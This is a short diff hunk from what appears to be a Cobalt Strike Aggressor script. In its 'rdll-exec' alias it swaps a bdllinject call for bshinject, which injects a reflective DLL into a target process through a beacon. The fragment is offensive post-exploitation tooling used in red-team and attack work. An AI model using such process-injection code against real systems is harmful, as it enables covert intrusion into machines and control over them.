@@ -70,7 +70,7 @@ alias rdll-exec {
     closef($handle);
 
     # self-inject the dll
-    bdllinject($beacon_id, $pid, $rdll_path);
+    bshinject($beacon_id, $pid, $barch, $rdll_path);
 
 }
 
